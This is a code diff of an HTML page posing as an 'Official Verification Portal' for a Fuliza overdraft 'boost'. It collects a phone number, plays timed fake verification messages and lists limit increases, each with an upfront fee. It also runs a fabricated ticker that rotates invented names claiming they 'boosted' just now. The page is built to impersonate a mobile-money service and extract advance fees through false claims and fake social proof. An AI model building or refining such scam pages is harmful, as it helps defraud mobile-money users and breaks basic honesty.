@@ -1,118 +1,126 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Fuliza Boost</title>
+  <title>FulizaBoost</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f3f4f6;
+      font-family: Arial;
+      background: #f5f5f5;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
+
     .card {
-      background: white;
+      background: #fff;
       padding: 20px;
-      border-radius: 16px;
-      width: 320px;
+      border-radius: 12px;
       text-align: center;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
     }
+
     input {
       width: 100%;
       padding: 12px;
-      margin-top: 10px;
-      border-radius: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
       border: 1px solid #ccc;
     }
+
     button {
-      margin-top: 15px;
       width: 100%;
       padding: 12px;
       background: green;
       color: white;
       border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
+      border-radius: 8px;
     }
-    .hidden { display: none; }
+
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    .box {
+      background: white;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .live {
+      background: #eef;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      font-size: 14px;
+    }
   </style>
 </head>
+
 <body>
 
 <div class="card" id="app">
   <h2>Fuliza Plus+</h2>
-  <p>Official Verification Portal</p>
+  <p>OFFICIAL VERIFICATION PORTAL</p>
 
-  <div id="step1">
-    <input id="phone" placeholder="Enter M-Pesa Number"/>
-    <button onclick="start()">Check My Eligibility</button>
-  </div>
-
-  <div id="loading" class="hidden">
-    <h3 id="loadingText">Connecting...</h3>
-  </div>
-
-  <div id="success" class="hidden">
-    <h2>✅ Congratulations!</h2>
-    <p id="result"></p>
-    <button onclick="showLimits()">Proceed to Upgrade</button>
-  </div>
-
-  <div id="limits" class="hidden">
-    <h3>Select Your Limit</h3>
-    <div id="list"></div>
-  </div>
+  <input id="phone" placeholder="Enter phone number" />
+  <button onclick="start()">Check My Eligibility</button>
 </div>
 
 <script>
+  const limits = [
+    [3000,250],[5000,293],[7500,350],[10000,500],
+    [12500,747],[16000,898],[21000,1015],[25500,1220],
+    [30000,1533],[35000,1730],[45000,2000],[60000,2250],[70000,2500]
+  ];
+
+  const names = ["Faith W.","James K.","Brian M.","Sarah N."];
+
   function start() {
     const phone = document.getElementById("phone").value;
-    if (!phone) return alert("Enter phone number");
+    if (!phone) return alert("Enter phone");
 
-    document.getElementById("step1").classList.add("hidden");
-    document.getElementById("loading").classList.remove("hidden");
-
-    let texts = [
-      "Connecting...",
-      "Verifying CRB...",
-      "Checking Usage..."
-    ];
-
-    let i = 0;
-    let interval = setInterval(() => {
-      document.getElementById("loadingText").innerText = texts[i];
-      i++;
-      if (i >= texts.length) {
-        clearInterval(interval);
-        showSuccess(phone);
-      }
+    document.getElementById("app").innerHTML = "Checking...";
+    
+    setTimeout(() => {
+      document.getElementById("app").innerHTML = "Connecting...";
     }, 1500);
+
+    setTimeout(showMain, 3000);
   }
 
-  function showSuccess(phone) {
-    document.getElementById("loading").classList.add("hidden");
-    document.getElementById("success").classList.remove("hidden");
-    document.getElementById("result").innerText =
-      phone + " is eligible for a boost.";
-  }
+  function showMain() {
+    document.getElementById("app").innerHTML = `
+      <h2>FulizaBoost</h2>
+      <p>Instant Limit Increase • Same Day Access</p>
 
-  function showLimits() {
-    document.getElementById("success").classList.add("hidden");
-    document.getElementById("limits").classList.remove("hidden");
+      <div class="live" id="live">Loading activity...</div>
 
-    let amounts = [3000,5000,7500,10000,16000,25000,45000,60000];
-    let list = document.getElementById("list");
+      <h3>Select Your Limit</h3>
+      <div class="grid">
+        ${limits.map(l => `
+          <div class="box">
+            <strong>Ksh ${l[0]}</strong><br/>
+            Fee: ${l[1]}
+          </div>
+        `).join("")}
+      </div>
+    `;
 
-    amounts.forEach(a => {
-      let div = document.createElement("div");
-      div.innerHTML = `<p>Ksh ${a} (Fee: ${Math.floor(a*0.05)})</p>`;
-      list.appendChild(div);
-    });
+    setInterval(() => {
+      const name = names[Math.floor(Math.random()*names.length)];
+      const amt = limits[Math.floor(Math.random()*limits.length)][0];
+
+      document.getElementById("live").innerText =
+        `${name} boosted to Ksh ${amt} just now`;
+    }, 3000);
   }
 </script>
 
